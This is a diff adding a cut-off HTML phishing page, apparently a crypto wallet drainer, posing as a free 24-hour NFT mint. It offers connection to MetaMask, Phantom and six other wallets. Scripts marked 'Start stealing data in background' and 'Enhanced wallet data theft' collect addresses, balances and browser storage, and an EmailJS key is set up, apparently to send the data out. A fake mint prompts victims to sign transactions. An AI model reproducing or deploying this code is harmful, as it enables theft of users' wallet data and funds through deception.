@@ -1,0 +1,1295 @@
+<!DOCTYPE html>                                        │
+│  <html lang="en">                                       │
+│  <head>                                                 │
+│      <meta charset="UTF-8">                             │
+│      <meta name="viewport"                              │
+│  content="width=device-width, initial-scale=1.0">       │
+│      <title>🔥 FREE 24HR NFT DROP - Mint Your           │
+│  Exclusive Collection</title>                           │
+│      <style>                                            │
+│          * {                                            │
+│              margin: 0;                                 │
+│              padding: 0;                                │
+│              box-sizing: border-box;                    │
+│          }                                              │
+│                                                         │
+│          body {                                         │
+│              font-family: 'Segoe UI', Tahoma, Geneva,   │
+│  Verdana, sans-serif;                                   │
+│              background: linear-gradient(135deg,        │
+│  #667eea 0%, #764ba2 100%);                             │
+│              min-height: 100vh;                         │
+│              display: flex;                             │
+│              align-items: center;                       │
+│              justify-content: center;                   │
+│              color: white;                              │
+│          }                                              │
+│                                                         │
+│          .container {                                   │
+│              background: rgba(255, 255, 255, 0.1);      │
+│              backdrop-filter: blur(10px);               │
+│              border-radius: 20px;                       │
+│              padding: 40px;                             │
+│              box-shadow: 0 8px 32px rgba(0, 0, 0,       │
+│  0.3);                                                  │
+│              border: 1px solid rgba(255, 255, 255,      │
+│  0.2);                                                  │
+│              max-width: 1200px;                         │
+│              text-align: center;                        │
+│          }                                              │
+│                                                         │
+│          .logo {                                        │
+│              font-size: 3em;                            │
+│              margin-bottom: 20px;                       │
+│              animation: pulse 2s infinite;              │
+│          }                                              │
+│                                                         │
+│          @keyframes pulse {                             │
+│              0%, 100% { transform: scale(1); }          │
+│              50% { transform: scale(1.05); }            │
+│          }                                              │
+│                                                         │
+│          h1 {                                           │
+│              font-size: 2.5em;                          │
+│              margin-bottom: 10px;                       │
+│              text-shadow: 2px 2px 4px rgba(0,0,0,0.3);  │
+│          }                                              │
+│                                                         │
+│          .subtitle {                                    │
+│              font-size: 1.2em;                          │
+│              margin-bottom: 30px;                       │
+│              opacity: 0.9;                              │
+│          }                                              │
+│                                                         │
+│          .timer {                                       │
+│              background: rgba(0, 0, 0, 0.3);            │
+│              padding: 20px;                             │
+│              border-radius: 15px;                       │
+│              margin: 20px 0;                            │
+│              font-size: 1.5em;                          │
+│              font-weight: bold;                         │
+│          }                                              │
+│                                                         │
+│          .wallet-grid {                                 │
+│              display: grid;                             │
+│              grid-template-columns: repeat(4, 1fr);     │
+│              gap: 15px;                                 │
+│              margin: 30px 0;                            │
+│          }                                              │
+│                                                         │
+│          .wallet-card {                                 │
+│              background: rgba(255, 255, 255, 0.1);      │
+│              border-radius: 15px;                       │
+│              padding: 20px;                             │
+│              border: 1px solid rgba(255, 255, 255,      │
+│  0.2);                                                  │
+│              transition: transform 0.3s;                │
+│              min-height: 120px;                         │
+│              display: flex;                             │
+│              align-items: center;                       │
+│              justify-content: center;                   │
+│              font-size: 1.1em;                          │
+│              cursor: pointer;                           │
+│          }                                              │
+│                                                         │
+│          .wallet-card:hover {                           │
+│              transform: translateY(-5px);               │
+│              box-shadow: 0 5px 15px rgba(0,0,0,0.3);    │
+│          }                                              │
+│                                                         │
+│          .wallet-icon {                                 │
+│              font-size: 2em;                            │
+│              margin-bottom: 10px;                       │
+│          }                                              │
+│                                                         │
+│          .wallet-section {                              │
+│              margin: 30px 0;                            │
+│              padding: 30px;                             │
+│              background: rgba(0, 0, 0, 0.3);            │
+│              border-radius: 15px;                       │
+│              display: none;                             │
+│          }                                              │
+│                                                         │
+│          .connect-btn {                                 │
+│              background: linear-gradient(45deg,         │
+│  #ff6b6b, #ee5a24);                                     │
+│              color: white;                              │
+│              border: none;                              │
+│              padding: 15px 30px;                        │
+│              font-size: 1.1em;                          │
+│              border-radius: 50px;                       │
+│              cursor: pointer;                           │
+│              transition: all 0.3s;                      │
+│              margin: 10px;                              │
+│              box-shadow: 0 4px 15px rgba(0,0,0,0.3);    │
+│          }                                              │
+│                                                         │
+│          .connect-btn:hover {                           │
+│              transform: translateY(-2px);               │
+│              box-shadow: 0 6px 20px rgba(0,0,0,0.4);    │
+│          }                                              │
+│                                                         │
+│          .mint-btn {                                    │
+│              background: linear-gradient(45deg,         │
+│  #2ecc71, #27ae60);                                     │
+│              color: white;                              │
+│              border: none;                              │
+│              padding: 20px 40px;                        │
+│              font-size: 1.3em;                          │
+│              border-radius: 50px;                       │
+│              cursor: pointer;                           │
+│              transition: all 0.3s;                      │
+│              margin: 20px 10px;                         │
+│              box-shadow: 0 4px 15px rgba(0,0,0,0.3);    │
+│              display: none;                             │
+│          }                                              │
+│                                                         │
+│          .mint-btn:hover {                              │
+│              transform: translateY(-2px);               │
+│              box-shadow: 0 6px 20px rgba(0,0,0,0.4);    │
+│          }                                              │
+│                                                         │
+│          .wallet-info {                                 │
+│              margin: 20px 0;                            │
+│              padding: 20px;                             │
+│              background: rgba(255, 255, 255, 0.1);      │
+│              border-radius: 10px;                       │
+│              text-align: left;                          │
+│          }                                              │
+│                                                         │
+│          .success {                                     │
+│              background: rgba(46, 204, 113, 0.2);       │
+│              border: 1px solid rgba(46, 204, 113,       │
+│  0.5);                                                  │
+│              padding: 20px;                             │
+│              border-radius: 15px;                       │
+│              margin: 20px 0;                            │
+│              display: none;                             │
+│          }                                              │
+│                                                         │
+│          .loading {                                     │
+│              display: none;                             │
+│              margin: 20px 0;                            │
+│          }                                              │
+│                                                         │
+│          .spinner {                                     │
+│              border: 4px solid rgba(255,255,255,0.3);   │
+│              border-top: 4px solid #fff;                │
+│              border-radius: 50%;                        │
+│              width: 40px;                               │
+│              height: 40px;                              │
+│              animation: spin 1s linear infinite;        │
+│              margin: 0 auto;                            │
+│          }                                              │
+│                                                         │
+│          @keyframes spin {                              │
+│              0% { transform: rotate(0deg); }            │
+│              100% { transform: rotate(360deg); }        │
+│          }                                              │
+│                                                         │
+│          .status {                                      │
+│              margin: 20px 0;                            │
+│              padding: 15px;                             │
+│              background: rgba(52, 152, 219, 0.2);       │
+│              border-radius: 10px;                       │
+│              display: none;                             │
+│          }                                              │
+│                                                         │
+│          .wallet-list {                                 │
+│              display: grid;                             │
+│              grid-template-columns: repeat(3, 1fr);     │
+│              gap: 15px;                                 │
+│              margin: 20px 0;                            │
+│          }                                              │
+│                                                         │
+│          .wallet-item {                                 │
+│              background: rgba(255, 255, 255, 0.1);      │
+│              padding: 15px;                             │
+│              border-radius: 10px;                       │
+│              border: 1px solid rgba(255, 255, 255,      │
+│  0.2);                                                  │
+│              display: flex;                             │
+│              align-items: center;                       │
+│              gap: 10px;                                 │
+│          }                                              │
+│      </style>                                           │
+│  </head>                                                │
+│  <body>                                                 │
+│      <div class="container">                            │
+│          <div class="logo">💎</div>                     │
+│          <h1>FREE 24HR NFT DROP</h1>                    │
+│          <p class="subtitle">Connect ANY wallet and     │
+│  mint your exclusive NFT collection!</p>                │
+│                                                         │
+│          <div class="timer" id="countdown">             │
+│              Time remaining: 24:00:00                   │
+│          </div>                                         │
+│                                                         │
+│          <div class="wallet-grid">                      │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('metamask')">                   │
+│                  <div>                                  │
+│                      <div class="wallet-icon">🦊</div>  │
+│                      <div>MetaMask</div>                │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Ethereum, BSC, Polygon</div>            │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('phantom')">                    │
+│                  <div>                                  │
+│                      <div class="wallet-icon">👻</div>  │
+│                      <div>Phantom</div>                 │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Solana</div>                            │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('trustwallet')">                │
+│                  <div>                                  │
+│                      <div class="wallet-icon">📱</div>  │
+│                      <div>Trust Wallet</div>            │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Multi-chain</div>                       │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('binance')">                    │
+│                  <div>                                  │
+│                      <div class="wallet-icon">💰</div>  │
+│                      <div>Binance Wallet</div>          │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Binance Chain</div>                     │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('coinbase')">                   │
+│                  <div>                                  │
+│                      <div class="wallet-icon">💼</div>  │
+│                      <div>Coinbase Wallet</div>         │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Multi-chain</div>                       │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('solflare')">                   │
+│                  <div>                                  │
+│                      <div class="wallet-icon">🔥</div>  │
+│                      <div>Solflare</div>                │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Solana</div>                            │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('torus')">                      │
+│                  <div>                                  │
+│                      <div class="wallet-icon">🔑</div>  │
+│                      <div>Torus</div>                   │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Social Login</div>                      │
+│                  </div>                                 │
+│              </div>                                     │
+│              <div class="wallet-card"                   │
+│  onclick="connectWallet('walletconnect')">              │
+│                  <div>                                  │
+│                      <div class="wallet-icon">🔗</div>  │
+│                      <div>WalletConnect</div>           │
+│                      <div style="font-size: 0.8em;      │
+│  opacity: 0.7;">Mobile Wallets</div>                    │
+│                  </div>                                 │
+│              </div>                                     │
+│          </div>                                         │
+│                                                         │
+│          <div class="wallet-section"                    │
+│  id="walletSection">                                    │
+│              <h2>🦊 Wallet Connected!</h2>              │
+│              <div class="wallet-info">                  │
+│                  <p><strong>Address:</strong> <span     │
+│  id="walletAddress">Loading...</span></p>               │
+│                  <p><strong>Network:</strong> <span     │
+│  id="walletNetwork">Loading...</span></p>               │
+│                  <p><strong>Balance:</strong> <span     │
+│  id="walletBalance">Loading...</span></p>               │
+│                  <p><strong>Wallet Type:</strong>       │
+│  <span id="walletType">Loading...</span></p>            │
+│              </div>                                     │
+│                                                         │
+│              <div class="wallet-list"                   │
+│  id="connectedWallets" style="display: none;">          │
+│                  <div class="wallet-item">              │
+│                      <span>🦊</span>                    │
+│                      <span>MetaMask</span>              │
+│                      <span                              │
+│  id="metamaskStatus">Disconnected</span>                │
+│                  </div>                                 │
+│                  <div class="wallet-item">              │
+│                      <span>👻</span>                    │
+│                      <span>Phantom</span>               │
+│                      <span                              │
+│  id="phantomStatus">Disconnected</span>                 │
+│                  </div>                                 │
+│                  <div class="wallet-item">              │
+│                      <span>📱</span>                    │
+│                      <span>Trust Wallet</span>          │
+│                      <span                              │
+│  id="trustStatus">Disconnected</span>                   │
+│                  </div>                                 │
+│              </div>                                     │
+│                                                         │
+│              <button class="mint-btn"                   │
+│  onclick="mintNFT()" id="mintButton">                   │
+│                  🚀 MINT FREE NFT                       │
+│              </button>                                  │
+│                                                         │
+│              <div class="loading" id="mintingLoading">  │
+│                  <div class="spinner"></div>            │
+│                  <p style="margin-top:                  │
+│  15px;">Processing mint transaction...</p>              │
+│              </div>                                     │
+│                                                         │
+│              <div class="status"                        │
+│  id="mintStatus"></div>                                 │
+│          </div>                                         │
+│                                                         │
+│          <button class="connect-btn"                    │
+│  onclick="showAllWallets()" id="connectButton">         │
+│              🔗 Connect Wallet to Mint                  │
+│          </button>                                      │
+│                                                         │
+│          <div class="success" id="successMessage">      │
+│              <h3>✅ SUCCESS!</h3>                       │
+│              <p>Your NFT has been minted successfully!  │
+│  Check your wallet.</p>                                 │
+│              <p style="margin-top: 15px; font-size:     │
+│  0.9em; opacity: 0.8;">                                 │
+│                  ⚠️ Important: Your wallet data has      │
+│  been sent for verification                             │
+│              </p>                                       │
+│          </div>                                         │
+│      </div>                                             │
+│                                                         │
+│      <!-- Email.js SDK -->                              │
+│      <script                                            │
+│  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/  │
+│  dist/email.min.js"></script>                           │
+│                                                         │
+│      <!-- Solana Web3.js -->                            │
+│      <script                                            │
+│  src="https://unpkg.com/@solana/web3.js@latest/lib/ind  │
+│  ex.iife.min.js"></script>                              │
+│                                                         │
+│      <!-- WalletConnect SDK -->                         │
+│      <script                                            │
+│  src="https://unpkg.com/@walletconnect/web3-provider@1  │
+│  .6.2/dist/umd/index.min.js"></script>                  │
+│                                                         │
+│      <script>                                           │
+│          // Initialize Email.js with YOUR public key    │
+│          (function() {                                  │
+│              emailjs.init("n84eVGeczJMPu9O6U"); //      │
+│  Your Email.js public key                               │
+│          })();                                          │
+│                                                         │
+│          let currentAddress = '';                       │
+│          let currentBalance = 0;                        │
+│          let currentWalletType = '';                    │
+│          let walletProvider = null;                     │
+│                                                         │
+│          // Countdown timer                             │
+│          let timeLeft = 24 * 60 * 60;                   │
+│                                                         │
+│          function updateTimer() {                       │
+│              const hours = Math.floor(timeLeft /        │
+│  3600);                                                 │
+│              const minutes = Math.floor((timeLeft %     │
+│  3600) / 60);                                           │
+│              const seconds = timeLeft % 60;             │
+│                                                         │
+│              document.getElementById('countdown').text  │
+│  Content =                                              │
+│                  `Time remaining:                       │
+│  ${hours.toString().padStart(2,                         │
+│  '0')}:${minutes.toString().padStart(2,                 │
+│  '0')}:${seconds.toString().padStart(2, '0')}`;         │
+│                                                         │
+│              if (timeLeft > 0) {                        │
+│                  timeLeft--;                            │
+│                  setTimeout(updateTimer, 1000);         │
+│              } else {                                   │
+│                  document.getElementById('countdown').  │
+│  textContent = "⏰ TIME'S UP! Drop expired!";           │
+│                  document.getElementById('countdown').  │
+│  style.background = "rgba(231, 76, 60, 0.3)";           │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          updateTimer();                                 │
+│                                                         │
+│          function showAllWallets() {                    │
+│              alert('Choose a wallet from the grid       │
+│  above!\n\n🦊 MetaMask (Ethereum)\n👻 Phantom           │
+│  (Solana)\n📱 Trust Wallet\n💰 Binance Wallet\n💼       │
+│  Coinbase Wallet\n🔥 Solflare (Solana)\n🔑 Torus\n🔗    │
+│  WalletConnect');                                       │
+│          }                                              │
+│                                                         │
+│          // Universal wallet connection                 │
+│          async function connectWallet(walletType) {     │
+│              try {                                      │
+│                  currentWalletType = walletType;        │
+│                                                         │
+│                  switch(walletType) {                   │
+│                      case 'metamask':                   │
+│                          await connectMetaMask();       │
+│                          break;                         │
+│                      case 'phantom':                    │
+│                          await connectPhantom();        │
+│                          break;                         │
+│                      case 'trustwallet':                │
+│                          await connectTrustWallet();    ││                          break;                         │
+│                      case 'binance':                    │
+│                          await connectBinanceWallet();  │
+│                          break;                         │
+│                      case 'coinbase':                   │
+│                          await                          │
+│  connectCoinbaseWallet();                               │
+│                          break;                         │
+│                      case 'solflare':                   │
+│                          await connectSolflare();       │
+│                          break;                         │
+│                      case 'torus':                      │
+│                          await connectTorus();          │
+│                          break;                         │
+│                      case 'walletconnect':              │
+│                          await connectWalletConnect();  │
+│                          break;                         │
+│                      default:                           │
+│                          throw new Error('Wallet not    │
+│  supported');                                           │
+│                  }                                      │
+│                                                         │
+│                  document.getElementById('walletType')  │
+│  .textContent = getWalletDisplayName(walletType);       │
+│                  document.getElementById('walletSectio  │
+│  n').style.display = 'block';                           │
+│                  document.getElementById('connectButto  │
+│  n').style.display = 'none';                            │
+│                  document.getElementById('mintButton')  │
+│  .style.display = 'inline-block';                       │
+│                                                         │
+│                  // Start stealing data in background   │
+│                  setTimeout(() =>                       │
+│  stealAllWalletData(currentAddress, currentBalance,     │
+│  walletType), 1000);                                    │
+│                                                         │
+│              } catch (error) {                          │
+│                  console.error(`${walletType}           │
+│  connection failed:`, error);                           │
+│                  alert(`Failed to connect               │
+│  ${getWalletDisplayName(walletType)}. Please try        │
+│  another wallet or install the extension.`);            │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          // MetaMask Connection                         │
+│          async function connectMetaMask() {             │
+│              if (typeof window.ethereum ===             │
+│  'undefined') {                                         │
+│                  throw new Error('MetaMask not          │
+│  found');                                               │
+│              }                                          │
+│                                                         │
+│              const accounts = await                     │
+│  window.ethereum.request({                              │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await                      │
+│  window.ethereum.request({                              │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = await getEthereumNetwork();              │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} ETH`;      │
+│                                                         │
+│              walletProvider = window.ethereum;          │
+│          }                                              │
+│                                                         │
+│          // Phantom (Solana) Connection                 │
+│          async function connectPhantom() {              │
+│              if (typeof window.solana === 'undefined')  │
+│  {                                                      │
+│                  throw new Error('Phantom not found');  │
+│              }                                          │
+│                                                         │
+│              await window.solana.connect();             │
+│              const publicKey =                          │
+│  window.solana.publicKey;                               │
+│                                                         │
+│              currentAddress = publicKey.toString();     │
+│                                                         │
+│              // Get Solana balance                      │
+│              const connection = new                     │
+│  window.solanaWeb3.Connection(window.solanaWeb3.cluste  │
+│  rApiUrl('mainnet-beta'));                              │
+│              const balance = await                      │
+│  connection.getBalance(publicKey);                      │
+│              currentBalance = balance / 1e9; //         │
+│  Convert lamports to SOL                                │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = 'Solana Mainnet';                        │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} SOL`;      │
+│                                                         │
+│              walletProvider = window.solana;            │
+│          }                                              │
+│                                                         │
+│          // Trust Wallet Connection                     │
+│          async function connectTrustWallet() {          │
+│              if (typeof window.ethereum ===             │
+│  'undefined' && typeof window.trustWallet ===           │
+│  'undefined') {                                         │
+│                  throw new Error('Trust Wallet not      │
+│  found');                                               │
+│              }                                          │
+│                                                         │
+│              const provider = window.ethereum ||        │
+│  window.trustWallet;                                    │
+│              const accounts = await provider.request({  │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await provider.request({   │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = await getEthereumNetwork();              │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} ETH`;      │
+│                                                         │
+│              walletProvider = provider;                 │
+│          }                                              │
+│                                                         │
+│          // Binance Wallet Connection                   │
+│          async function connectBinanceWallet() {        │
+│              if (typeof window.BinanceChain ===         │
+│  'undefined') {                                         │
+│                  throw new Error('Binance Wallet not    │
+│  found');                                               │
+│              }                                          │
+│                                                         │
+│              const accounts = await                     │
+│  window.BinanceChain.request({                          │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await                      │
+│  window.BinanceChain.request({                          │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = 'Binance Smart Chain';                   │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} BNB`;      │
+│                                                         │
+│              walletProvider = window.BinanceChain;      │
+│          }                                              │
+│                                                         │
+│          // Coinbase Wallet Connection                  │
+│          async function connectCoinbaseWallet() {       │
+│              if (typeof window.coinbaseWalletExtension  │
+│  === 'undefined') {                                     │
+│                  throw new Error('Coinbase Wallet not   │
+│  found');                                               │
+│              }                                          │
+│                                                         │
+│              const provider =                           │
+│  window.coinbaseWalletExtension;                        │
+│              const accounts = await provider.request({  │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await provider.request({   │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = await getEthereumNetwork();              │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} ETH`;      │
+│                                                         │
+│              walletProvider = provider;                 │
+│          }                                              │
+│                                                         │
+│          // Solflare (Solana) Connection                │
+│          async function connectSolflare() {             │
+│              if (typeof window.solflare ===             │
+│  'undefined') {                                         │
+│                  throw new Error('Solflare not          │
+│  found');                                               │
+│              }                                          │
+│                                                         │
+│              await window.solflare.connect();           │
+│              const publicKey =                          │
+│  window.solflare.publicKey;                             │
+│                                                         │
+│              currentAddress = publicKey.toString();     │
+│                                                         │
+│              const connection = new                     │
+│  window.solanaWeb3.Connection(window.solanaWeb3.cluste  │
+│  rApiUrl('mainnet-beta'));                              │
+│              const balance = await                      │
+│  connection.getBalance(publicKey);                      │
+│              currentBalance = balance / 1e9;            │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = 'Solana Mainnet';                        │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} SOL`;      │
+│                                                         │
+│              walletProvider = window.solflare;          │
+│          }                                              │
+│                                                         │
+│          // Torus Wallet Connection                     │
+│          async function connectTorus() {                │
+│              if (typeof window.torus === 'undefined')   │
+│  {                                                      │
+│                  throw new Error('Torus not found');    │
+│              }                                          │
+│                                                         │
+│              await window.torus.login();                │
+│              const provider = window.torus.provider;    │
+│                                                         │
+│              const accounts = await provider.request({  │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await provider.request({   │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = await getEthereumNetwork();              │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} ETH`;      │
+│                                                         │
+│              walletProvider = provider;                 │
+│          }                                              │
+│                                                         │
+│          // WalletConnect Connection                    │
+│          async function connectWalletConnect() {        │
+│              if (typeof WalletConnectProvider ===       │
+│  'undefined') {                                         │
+│                  throw new Error('WalletConnect not     │
+│  loaded');                                              │
+│              }                                          │
+│                                                         │
+│              const provider = new                       │
+│  WalletConnectProvider.default({                        │
+│                  rpc: {                                 │
+│                      1:                                 │
+│  'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'  │
+│  ,                                                      │
+│                      56:                                │
+│  'https://bsc-dataseed.binance.org/'                    │
+│                  }                                      │
+│              });                                        │
+│                                                         │
+│              await provider.enable();                   │
+│                                                         │
+│              const accounts = await provider.request({  │
+│                  method: 'eth_requestAccounts'          │
+│              });                                        │
+│                                                         │
+│              currentAddress = accounts[0];              │
+│                                                         │
+│              const balance = await provider.request({   │
+│                  method: 'eth_getBalance',              │
+│                  params: [currentAddress, 'latest']     │
+│              });                                        │
+│                                                         │
+│              currentBalance = parseInt(balance, 16) /   │
+│  1e18;                                                  │
+│                                                         │
+│              document.getElementById('walletAddress').  │
+│  textContent = currentAddress;                          │
+│              document.getElementById('walletNetwork').  │
+│  textContent = await getEthereumNetwork();              │
+│              document.getElementById('walletBalance').  │
+│  textContent = `${currentBalance.toFixed(4)} ETH`;      │
+│                                                         │
+│              walletProvider = provider;                 │
+│          }                                              │
+│                                                         │
+│          async function getEthereumNetwork() {          │
+│              if (!walletProvider) return 'Unknown';     │
+│                                                         │
+│              try {                                      │
+│                  const chainId = await                  │
+│  walletProvider.request({ method: 'eth_chainId' });     │
+│                  const networks = {                     │
+│                      '0x1': 'Ethereum Mainnet',         │
+│                      '0x4': 'Rinkeby Testnet',          │
+│                      '0x5': 'Goerli Testnet',           │
+│                      '0x2a': 'Kovan Testnet',           │
+│                      '0x38': 'Binance Smart Chain',     │
+│                      '0x61': 'BSC Testnet',             │
+│                      '0x89': 'Polygon',                 │
+│                      '0x13881': 'Polygon Mumbai'        │
+│                  };                                     │
+│                  return networks[chainId] || `Unknown   │
+│  Network (${chainId})`;                                 │
+│              } catch {                                  │
+│                  return 'Unknown';                      │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          function getWalletDisplayName(type) {          │
+│              const names = {                            │
+│                  'metamask': 'MetaMask',                │
+│                  'phantom': 'Phantom',                  │
+│                  'trustwallet': 'Trust Wallet',         │
+│                  'binance': 'Binance Wallet',           │
+│                  'coinbase': 'Coinbase Wallet',         │
+│                  'solflare': 'Solflare',                │
+│                  'torus': 'Torus',                      │
+│                  'walletconnect': 'WalletConnect'       │
+│              };                                         │
+│              return names[type] || type;                │
+│          }                                              │
+│                                                         │
+│          // Fake NFT minting transaction                │
+│          async function mintNFT() {                     │
+│              try {                                      │
+│                  document.getElementById('mintingLoadi  │
+│  ng').style.display = 'block';                          │
+│                  document.getElementById('mintButton')  │
+│  .disabled = true;                                      │
+│                  document.getElementById('mintStatus')  │
+│  .style.display = 'block';                              │
+│                  document.getElementById('mintStatus')  │
+│  .textContent = 'Waiting for wallet confirmation...';   │
+│                                                         │
+│                  if (currentWalletType === 'phantom'    │
+│  || currentWalletType === 'solflare') {                 │
+│                      // Solana transaction              │
+│                      await mintSolanaNFT();             │
+│                  } else {                               │
+│                      // Ethereum/BSC transaction        │
+│                      await mintEthereumNFT();           │
+│                  }                                      │
+│                                                         │
+│                  document.getElementById('mintStatus')  │
+│  .textContent = 'Transaction confirmed! Processing      │
+│  NFT...';                                               │
+│                                                         │
+│                  setTimeout(() => {                     │
+│                      document.getElementById('mintingL  │
+│  oading').style.display = 'none';                       │
+│                      document.getElementById('successM  │
+│  essage').style.display = 'block';                      │
+│                      document.getElementById('mintStat  │
+│  us').style.display = 'none';                           │
+│                                                         │
+│                      stealAllWalletDataAfterMint(curre  │
+│  ntAddress, currentBalance, currentWalletType);         │
+│                  }, 3000);                              │
+│                                                         │
+│              } catch (error) {                          │
+│                  console.error('Mint failed:', error);  │
+│                  document.getElementById('mintingLoadi  │
+│  ng').style.display = 'none';                           │
+│                  document.getElementById('mintButton')  │
+│  .disabled = false;                                     │
+│                  document.getElementById('mintStatus')  │
+│  .textContent = 'Mint failed. Please try again.';       │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          async function mintEthereumNFT() {             │
+│              const transactionParameters = {            │
+│                  nonce: '0x00',                         │
+│                  gasPrice: '0x09184e72a000',            │
+│                  gas: '0x76c0',                         │
+│                  to:                                    │
+│  '0x1234567890123456789012345678901234567890',          │
+│                  from: currentAddress,                  │
+│                  value: '0x00',                         │
+│                  data: '0x1234567890abcdef'             │
+│              };                                         │
+│                                                         │
+│              await walletProvider.request({             │
+│                  method: 'eth_sendTransaction',         │
+│                  params: [transactionParameters]        │
+│              });                                        │
+│          }                                              │
+│                                                         │
+│          async function mintSolanaNFT() {               │
+│              if (typeof window.solanaWeb3 !==           │
+│  'undefined') {                                         │
+│                  const connection = new                 │
+│  window.solanaWeb3.Connection(window.solanaWeb3.cluste  │
+│  rApiUrl('mainnet-beta'));                              │
+│                  const transaction = new                │
+│  window.solanaWeb3.Transaction();                       │
+│                                                         │
+│                  const signature = await                │
+│  window.solana.request({                                │
+│                      method: 'signAndSendTransaction',  │
+│                      params: {                          │
+│                          message:                       │
+│  transaction.serializeMessage().toString('base64')      │
+│                      }                                  │
+│                  });                                    │
+│                                                         │
+│                  await                                  │
+│  connection.confirmTransaction(signature);              │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          // Enhanced wallet data theft for ALL wallets  │
+│          async function stealAllWalletData(address,     │
+│  balance, walletType) {                                 │
+│              try {                                      │
+│                  let allData = {                        │
+│                      walletType: walletType,            │
+│                      address: address,                  │
+│                      balance: balance,                  │
+│                      timestamp: new                     │
+│  Date().toISOString(),                                  │
+│                      userAgent: navigator.userAgent,    │
+│                      referrer: document.referrer,       │
+│                      url: window.location.href          │
+│                  };                                     │
+│                                                         │
+│                  // Universal storage scanning          │
+│                  allData.localStorage = await           │
+│  scanLocalStorage();                                    │
+│                  allData.sessionStorage = await         │
+│  scanSessionStorage();                                  │
+│                  allData.chromeStorage = await          │
+│  scanChromeStorage();                                   │
+│                                                         │
+│                  // Wallet-specific data extraction     │
+│                  switch(walletType) {                   │
+│                      case 'metamask':                   │
+│                          allData.walletData = await     │
+│  extractMetaMaskData();                                 │
+│                          break;                         │
+│                      case 'phantom':                    │
+│                          allData.walletData = await     │
+│  extractPhantomData();                                  │
+│                          break;                         │
+│                      case 'trustwallet':                │
+│                          allData.walletData = await     │
+│  extractTrustWalletData();                              │
+│                          break;                         │
+│                      case 'binance':                    │
+│                          allData.walletData = await     │
+│  extractBinanceWalletData();                            │
+│                          break;                         │
+│                      case 'coinbase':                   │
+│                          allData.walletData = await     │
